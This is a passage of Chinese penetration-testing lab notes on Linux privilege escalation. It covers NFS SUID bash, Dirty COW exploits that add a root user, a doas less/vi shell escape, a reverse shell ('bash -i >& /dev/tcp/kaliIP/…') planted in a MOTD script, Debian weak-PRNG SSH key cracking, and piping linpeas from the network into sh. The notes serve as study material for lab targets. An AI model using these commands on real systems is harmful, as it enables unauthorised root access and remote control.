<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n5568" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">msfvenom <span class="cm-attribute">-p</span> linux/x86/exec <span class="cm-def">CMD</span><span class="cm-operator">=</span><span class="cm-string">"/bin/bash -p"</span> <span class="cm-attribute">-f</span> elf <span class="cm-attribute">-o</span> /tmp/nfs/shell.elf</span></pre></div></div></div></div></div></div><div></div></div></div></pre>


<table>
<thead>
<tr>
<th><code>-p linux/x86/exec</code></th>
<th><strong>载荷（payload）</strong>：<code>exec</code>模块，<strong>只负责执行一条系统命令</strong>，无网络、无回连</th>
</tr>
</thead>
<tbody><tr>
<td><code>CMD=&quot;/bin/bash -p&quot;</code></td>
<td><strong>要执行的命令</strong>：<code>/bin/bash -p</code> <code>-p</code>保持 euid&#x3D;0，防止 bash 自动降权</td>
</tr>
<tr>
<td><code>-f elf</code></td>
<td><strong>输出格式</strong>：ELF 可执行文件（Linux 原生格式）</td>
</tr>
</tbody></table>
<p><strong>ELF 就是 Linux 的‘exe’：头里告诉你怎么加载、段里放代码和数据，红队改入口、改 GOT、改 INTERP 就能劫持执行流。</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251128190958650.png?lastModify=1766751620" alt="image-20251128190958650"></p>
<p><strong>给他****xs</strong>权限，这样我们就能在靶机中以root身份执行他，执行以后将以属主的权限新建一个bash</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251128191306496.png?lastModify=1766751620" alt="image-20251128191306496"></p>
<p><strong>cd到tmp目录下，看到确实挂载了</strong><code>shell.elf</code>，执行后成功获得root权限</p>
<blockquote>
<p><strong>生成的</strong><code>shell.elf</code></p>
<ul>
<li><strong>体积超小</strong>（几百字节），<strong>无网络特征</strong> → 绕过流量审计。</li>
<li><strong>不依赖 libc 路径</strong> → 旧系统&#x2F;容器通用。</li>
<li><strong>立即生效</strong> → 适合“只能写、不能编译”的靶机。</li>
</ul>
</blockquote>
<p><strong>不用</strong><code>msfvenom</code>生成脚本的命令</p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n5598" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">mkdir</span> /tmp/mnt</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">mount <span class="cm-attribute">-t</span> nfs <span class="cm-attribute">-o</span> <span class="cm-def">vers</span><span class="cm-operator">=</span><span class="cm-number">3</span> 靶机IP:/tmp /tmp/mnt</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">cd</span> /tmp/mnt</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">cp</span> /bin/bash .</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">chmod</span> <span class="cm-operator">+</span>xs <span class="cm-builtin">bash</span>               <span class="cm-comment"># 造 SUID bash</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation">./bash <span class="cm-attribute">-p</span>                    <span class="cm-comment"># 拿 root</span></span></pre></div></div></div></div></div><div></div></div></div></pre>

<h2 id="内核漏洞利用提权"><a href="#内核漏洞利用提权" class="headerlink" title="内核漏洞利用提权"></a>内核漏洞利用提权</h2><p><strong>要点：  选择，适配，调试，靶机环境       一个不行另一个</strong></p>
<p><strong>内核漏洞一般是没办法的时候才用，很容易导致系统不稳定，警告管理员，导致渗透测试&#x2F;攻防的失败</strong></p>
<p><strong>今天 Linux 最新稳定内核是 6.13.8，长期支持版 6.6.63；打靶先看 uname -r，5.15&#x2F;4.18&#x2F;3.10 分别对应 Ubuntu 22、CentOS 8、CentOS 7 三大常用靶机版本。</strong></p>
<p><code>uname -a</code>查看内核版本</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251128192208068.png?lastModify=1766751620" alt="image-20251128192208068"></p>
<p><strong>我们用linpeas.sh来实现</strong></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n5614" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-comment">#linpeas官方推荐最佳实践，管道符给到sh执行linpeas的脚本，最大的好处是直接在线下载，直接执行，并不在本地存有任何文件</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">curl</span> <span class="cm-attribute">-L</span> https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | <span class="cm-builtin">sh</span> </span></pre></div></div></div></div></div><div></div></div></div></pre>

<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251128192554728.png?lastModify=1766751620" alt="image-20251128192554728">这里发现靶机中并没有安装curl，变通一下</p>
<p><strong>在kali中下载好linpeas</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251128192654492.png?lastModify=1766751620" alt="image-20251128192654492"></p>
<p><strong>用nc建立一个监听，同时把</strong><code>linpeas</code>输入到nc中</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251128192824642.png?lastModify=1766751620" alt="image-20251128192824642"></p>
<p><strong>然后在靶机中执行扫描：用cat接收伪设备传过来的linpeas ，执行后会在内存中进行扫描（wget kali中的linpeas可以，但不是最佳实践 ）</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251128193023341.png?lastModify=1766751620" alt="image-20251128193023341"></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251128193308527.png?lastModify=1766751620" alt="image-20251128193308527"></p>
<p><strong>扫描结果显示有dirty cow，probable，40611（记录有很多条，一个个试就行）</strong></p>
<p><strong>看完以后回到kali，</strong><code>searchsploit 40611</code>，和靶机的内核版本号是吻合的，就用它试试<code>-m</code>镜像下载</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251128193638081.png?lastModify=1766751620" alt="image-20251128193638081"></p>
<p><strong>看一下里面的内容</strong></p>
<p><strong>注释非常重要，一定要看</strong></p>
<p><strong>这里的执行使用方式比较复杂，需要****依次输入各行命令</strong></p>
<blockquote>
<p><strong>sudo -s</strong></p>
<p>**echo xxx &gt; foo **</p>
<p><strong>…</strong></p>
<p>**编译方式 **<code>gcc -pthread dirtyc0w.c -o dirtyc0w</code></p>
<p>**编译完成直接执行 **<code>./dirtyc0w foo m000000000000000000000000000000</code></p>
</blockquote>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251128193831391.png?lastModify=1766751620" alt="image-20251128193831391"></p>
<p>**kali建立简易服务器 **<code>sudo php -S 0:80</code></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251128194223669.png?lastModify=1766751620" alt="image-20251128194223669"></p>
<p><strong>在靶机上下载</strong><code>40611.c</code></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251128194331156.png?lastModify=1766751620" alt="image-20251128194331156"></p>
<p>**进行编译 **<code>gcc -pthread 40611.c -o 40611</code></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251128194429793.png?lastModify=1766751620" alt="image-20251128194429793"></p>
<p><strong>然后按步骤走，这里就不演示了</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251128193831391.png?lastModify=1766751620" alt="image-20251128193831391"></p>
<p><code>searchsploit</code>其他脚本利用：** **我们根据关键词<code>dirtycow</code>进行搜索，内核 <code>2.6.22-3.9</code>都可以考虑，而在每一个利用名称的后面，有一个实现方法</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251128195228057.png?lastModify=1766751620" alt="image-20251128195228057"></p>
<p><code>write acces method</code>：<strong>写访问的方法</strong>，对内存进行读取，理论上可以读取内存中的任何字段（稍微复杂一点点，但更有通用性）</p>
<p><code>/etc/passwd method</code>他是对<strong>passwd</strong>进行操作（看起来更直观简单）</p>
<p><strong>从利用的实现方法来说，都属于</strong><code>Race Condition</code>静态条件</p>
<p><strong>下面是</strong><code>40839.c</code>使用： 按他的编译以后；直接执行或执行并给他一个新密码；<code>su</code>即可提权。看起来更简洁</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251128195644383.png?lastModify=1766751620" alt="image-20251128195644383"></p>
<p><strong>靶机中下载kali中的</strong><code>40839.c</code></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251128195955027.png?lastModify=1766751620" alt="image-20251128195955027"></p>
<p><strong>按照说明编译：</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251128200034598.png?lastModify=1766751620" alt="image-20251128200034598"></p>
<p><strong>执行后，让你输入一个新用户firefart（脚本里面自带的名称）的密码</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251128200503064.png?lastModify=1766751620" alt="image-20251128200503064"></p>
<p><strong>执行过程：</strong></p>
<ul>
<li><strong>首先将</strong><code>/etc/passwd</code>进行备份到<code>/tmp/passwd.bak</code> 我们实际利用passwd提权时也是这样</li>
<li><strong>然后输入新用户</strong><code>firefart</code>（脚本里面自带的名称）的密码</li>
<li><strong>之后将你输入的密码转为hash值，写成</strong><code>passwd</code>文件中的格式   **用户名:密码哈希:用户id:组id: : : **的格式</li>
<li><strong>将这一串格式的字符写入内存，过程有点慢</strong></li>
<li><strong>最终成功创建新用户   firefart ：你输入的密码</strong></li>
</ul>
<p>**接下来切换到该用户即可 **<code>su/su firefart</code></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251128201338464.png?lastModify=1766751620" alt="image-20251128201338464"></p>
<h2 id="doas-less-vi提权"><a href="#doas-less-vi提权" class="headerlink" title="doas less + vi提权"></a>doas less + vi提权</h2><p><strong>doas 就是‘轻量版 sudo’：配置一两行就能让普通用户升 root，代码短小漏洞少，OpenBSD&#x2F;Alpine 标配</strong></p>
<p><strong>OpenBSD</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251128203540061.png?lastModify=1766751620" alt="image-20251128203540061"></p>
<p><strong>看id时候，发现分属于两个用户组</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251128203315992.png?lastModify=1766751620" alt="image-20251128203315992"><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251128203852982.png?lastModify=1766751620" alt="image-20251128203852982"></p>
<p><strong>user用户有权限的文件如右图   backup.7z是破解登录该用户密码的文件，这里不用管</strong></p>
<p><strong>看当前用户有哪些特权文件</strong>	** **</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251128204147737.png?lastModify=1766751620" alt="image-20251128204147737"></p>
<p><code>debian/ubuntu</code>系统下会是<code>sudo</code> 而现在 **<code>preBSD/openBSD</code>**通常是<code>doas</code>  作为提升用户权限的手段</p>
<p><strong>查看</strong><code>doas</code>的配置文件 <code>cat /etc/doas.conf</code> （经验）</p>
<p><strong>这条命令类似于</strong><code>sudo -l</code></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251128204626137.png?lastModify=1766751620" alt="image-20251128204626137"></p>
<p><strong>允许没有密码的情况下，保留用户当前环境变量，user这个用户可以按照root执行less 后面可以接参数</strong></p>
<table>
<thead>
<tr>
<th><code>keepenv</code></th>
<th><strong>保留用户当前环境变量</strong>（等价<code>doas -E</code>）</th>
</tr>
</thead>
<tbody><tr>
<td><code>user</code></td>
<td><strong>限定单用户</strong>（不是组）</td>
</tr>
<tr>
<td><code>as root</code></td>
<td><strong>以 root 身份</strong>运行</td>
</tr>
<tr>
<td><code>cmd /usr/bin/less</code></td>
<td><strong>只能执行<code>/usr/bin/less</code>这一个二进制</strong></td>
</tr>
<tr>
<td><code>args /var/log/authlog</code></td>
<td><strong>且参数必须完全匹配<code>/var/log/authlog</code></strong>（不能多、不能少）</td>
</tr>
</tbody></table>
<p><strong>执行看看（&#x2F;authlog是参数）</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251128205341048.png?lastModify=1766751620" alt="image-20251128205341048"></p>
<p><strong>这里相当于用less命令读这个日志</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251128205432187.png?lastModify=1766751620" alt="image-20251128205432187"><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251128205608819.png?lastModify=1766751620" alt="image-20251128205608819"></p>
<p><strong>这里有个less的选项，就是v：打开文本编辑器编辑这个文档。我们现在是读，按v会启动vi编辑这个文档，如下图</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251128205622981.png?lastModify=1766751620" alt="image-20251128205622981"></p>
<p>**现在是可编辑状态，我的权限是doas给的，相当于权限被提高了，大多数如果不做特殊配置的话，他就是系统的权限，这个权限如何把他引导到shell里？doas有高权限，用高权限启动一个shell，而现在在vi里，这个编辑器要想执行shell命令，这也是vi自有的命令  用 ****<code>:</code> <code>!</code>** 执行shell命令</p>
<p><strong>less命令有v这个操作，v能打开vi编辑器，而vi编辑器他已经是继承less的doas权限，doas权限我能启动一个shell，就能提权</strong></p>
<p><strong>less打开日志后，按****v</strong>，直接按**!**启动一个新的shell，shell里面继续执行sh。回车后获得root权限</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251128210401833.png?lastModify=1766751620" alt="image-20251128210401833"></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251128210711763.png?lastModify=1766751620" alt="image-20251128210711763"></p>
<h3 id="相关知识点"><a href="#相关知识点" class="headerlink" title="相关知识点"></a>相关知识点</h3><h4 id="为什么-sudo-不拦截？"><a href="#为什么-sudo-不拦截？" class="headerlink" title="为什么 sudo 不拦截？"></a>为什么 sudo 不拦截？</h4><ul>
<li>**sudo 只检查了 **<strong>最初命令路径</strong>（<code>/usr/bin/less</code>）</li>
<li><strong>less 的子进程</strong> 属于 <strong>合法 root 进程的自我派生</strong>，<strong>sudo 不再二次校验</strong> **→ **<strong>只要程序本身带 <code>!command</code> 功能，就能逃逸</strong></li>
</ul>
<h4 id="哪些程序有-逃逸"><a href="#哪些程序有-逃逸" class="headerlink" title="哪些程序有 ! 逃逸"></a>哪些程序有 <code>!</code> 逃逸</h4><table>
<thead>
<tr>
<th><strong>程序</strong></th>
<th><strong>按键</strong></th>
<th><strong>备注</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>less&#x2F;more</strong></td>
<td><code>!sh</code></td>
<td><strong>最常见</strong></td>
</tr>
<tr>
<td><strong>vim&#x2F;nano</strong></td>
<td><code>:!/bin/sh</code></td>
<td><strong>同样有效</strong></td>
</tr>
<tr>
<td><strong>man</strong></td>
<td><code>!sh</code></td>
<td><strong>内部用 less</strong></td>
</tr>
<tr>
<td><strong>mail&#x2F;mutt</strong></td>
<td><code>!sh</code></td>
<td><strong>邮件客户端</strong></td>
</tr>
<tr>
<td><strong>ftp</strong></td>
<td><code>!sh</code></td>
<td><strong>交互命令</strong></td>
</tr>
</tbody></table>
<h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><p><strong>“<code>!sh</code> 是 less 内置的‘外部命令’功能，fork 时继承当前 root 身份，sudo 只检查首程序路径，不拦子进程 → 按一下 !sh 就 root；修掉给 less 加 noexec 或换 sudoedit 即可。”</strong></p>
<h2 id="利用MOTD机制提权"><a href="#利用MOTD机制提权" class="headerlink" title="利用MOTD机制提权"></a>利用MOTD机制提权</h2><p>**motd &#x3D; **<strong>Message of the Day</strong>（每日消息）</p>
<ul>
<li>**纯文本文件，**<strong>用户每次登录 SSH&#x2F;TTY 后自动显示</strong>。</li>
<li>**常用于 **<strong>法律声明、管理员通知、系统状态、彩蛋标语</strong>。</li>
</ul>
<table>
<thead>
<tr>
<th><strong>路径</strong></th>
<th><strong>说明</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>/etc/motd</code></td>
<td><strong>静态公告</strong>（最常用），登出-再登录即更新。</td>
</tr>
<tr>
<td><code>/etc/motd.d/*.conf</code></td>
<td><strong>systemd 分段</strong>，按字母顺序拼接。</td>
</tr>
<tr>
<td><code>/run/motd.dynamic</code></td>
<td><strong>动态脚本输出</strong>（<code>pam_motd</code>调用）。</td>
</tr>
<tr>
<td><code>~/.motd</code></td>
<td><strong>用户个人</strong>（极少用）。</td>
</tr>
</tbody></table>
<p><strong>motd 就是登录后自动显示的‘今日公告’文件，常放法律声明或系统彩蛋；红队可用来钓鱼、留标语、藏 flag，改 <code>/etc/motd</code> 立刻生效</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251128211605016.png?lastModify=1766751620" alt="image-20251128211605016"></p>
<p><code>00-header</code>排在最先显示的，而<code>update</code>是对<code>motd</code>进行更新的<strong>一组</strong>脚本，因为 <code>.d</code>是指目录，目录里面是脚本</p>
<p><code>motd</code>是全局性的，脚本执行性的，Linux里面经常会有的应用</p>
<p>**只要看到 **<code>motd  update  00-header</code>肯定会想到利用</p>
<p><code>00-header</code>里面执行的 <code>#!/bin/sh 和  print 语句</code>我们就可以把反弹shell写进去，保存退出</p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="" cid="n5796" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">bash -c "bash -i >& /dev/tcp/kaliIP/监听端口 0>&1"</span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251128212400891.png?lastModify=1766751620" alt="image-20251128212400891"></p>
<p><strong>按下图操作，用户SSH登录后，出发MOTD欢迎界面，执行我们的恶意命令</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251128212641816.png?lastModify=1766751620" alt="image-20251128212641816"></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251128213114519.png?lastModify=1766751620" alt="image-20251128213114519"></p>
<p><strong>root权限</strong></p>
<h2 id="可预测PRNG暴力破解SSH提权"><a href="#可预测PRNG暴力破解SSH提权" class="headerlink" title="可预测PRNG暴力破解SSH提权"></a>可预测PRNG暴力破解SSH提权</h2><p><strong>对应****靶机精炼</strong>的”pWnOS1.0 - 选择hard模式再次用完全不同的方法实现这台靶机的渗透测试。-解法二“</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251128214612950.png?lastModify=1766751620" alt="image-20251128214612950"></p>
<p><strong>下面演示的是获得初始权限的过程，提权也是同理</strong></p>
<h3 id="用公钥信息破解出私钥（精）"><a href="#用公钥信息破解出私钥（精）" class="headerlink" title="用公钥信息破解出私钥（精）"></a>用公钥信息破解出私钥（精）</h3><p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251112185610932.png?lastModify=1766751620" alt="image-20251112185610932"></p>
<p><strong>我们拿到的authorized_keys是****公钥</strong> ，公钥一定是放在服务器端的，私钥是管理员自己电脑上，用私钥连接服务器的公钥</p>
<p>**我们需要有自己的私钥库进行碰撞，操作时需要用到伪随机数生成器的库  ****(相当于密码表—不一定会成功，可以多换用户公钥或换密码本)**</p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="" cid="n5818" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">searchsploit prng       preudo random number generator</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span>  伪        随机的 数字  生成器</span></pre></div></div></div></div></div><div></div></div></div></pre>

<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251128214053156.png?lastModify=1766751620" alt="image-20251128214053156"></p>
<p><strong>这里涉及到****ssh非对称加密的机制</strong>的理解，虽然不需要了解算法，但是要知道非对称加密中涉及到<strong>prng</strong>这样一件事</p>
<p>** **<img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251112190413247.png?lastModify=1766751620" alt="image-20251112190413247"></p>
<p><strong>下载一个镜像</strong></p>
<p><strong>我们采用伪随机数生成器的机制进行碰撞，获得私钥（相当于有公钥，和所有的私钥，找到对应的即可）</strong></p>
<p><strong>运行脚本</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251112190851409.png?lastModify=1766751620" alt="image-20251112190851409"></p>
<h3 id="下载公私钥对库"><a href="#下载公私钥对库" class="headerlink" title="下载公私钥对库"></a>下载公私钥对库</h3><p><code>wget</code></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251112191040277.png?lastModify=1766751620" alt="image-20251112191040277"></p>
<h3 id="解压缩"><a href="#解压缩" class="headerlink" title="解压缩"></a>解压缩</h3><table>
<thead>
<tr>
<th><strong>参数</strong></th>
<th><strong>完整单词</strong></th>
<th><strong>作用</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>v</code></td>
<td><strong>verbose</strong></td>
<td><strong>显示详细过程（列出正在解压的文件名）</strong></td>
</tr>
<tr>
<td><code>j</code></td>
<td><strong>bzip2</strong></td>
<td><strong>通过 bzip2 算法解压缩（对应</strong><code>.tar.bz2</code>或<code>.tbz2</code>）</td>
</tr>
<tr>
<td><code>x</code></td>
<td><strong>extract</strong></td>
<td><strong>执行“解包&#x2F;解压”操作</strong></td>
</tr>
<tr>
<td><code>f</code></td>
<td><strong>file</strong></td>
<td><strong>后接归档文件名（必须与文件名成对出现）</strong></td>
</tr>
</tbody></table>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="" cid="n5851" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">sudo tar vjxf 5622.tar.bz2</span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251112191137201.png?lastModify=1766751620" alt="image-20251112191137201"></p>
<p><strong>里面带pub的是公钥，同名（同编号）的是对应的私钥</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251112191250695.png?lastModify=1766751620" alt="image-20251112191250695"></p>
<p><strong>解压完会新出现一个rsa的目录，里面就是公私密钥对</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251112191426446.png?lastModify=1766751620" alt="image-20251112191426446"></p>
<h3 id="用authorized-keys的公钥进行搜索"><a href="#用authorized-keys的公钥进行搜索" class="headerlink" title="用authorized_keys的公钥进行搜索"></a>用authorized_keys的公钥进行搜索</h3><p><strong>从ssh-rsa 开始取30-40个数进行搜索就行</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251112191655252.png?lastModify=1766751620" alt="image-20251112191655252"></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="" cid="n5861" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">sudo grep -lr "xxx"       递归搜索包括找到下级文件</span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251112191939187.png?lastModify=1766751620" alt="image-20251112191939187"></p>
<p><strong>不一定会成功，这个用户的不行就换另一个试试</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251112192242611.png?lastModify=1766751620" alt="image-20251112192242611"></p>
<p><strong>找到公钥的编号了，完全一致。接下来找没有扩展名</strong><code>.pub</code>的就是私钥</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251112192501187.png?lastModify=1766751620" alt="image-20251112192501187"></p>
<p><strong>将私钥放在熟悉的位置</strong></p>
<p><strong>接下来尝试ssh登录</strong></p>
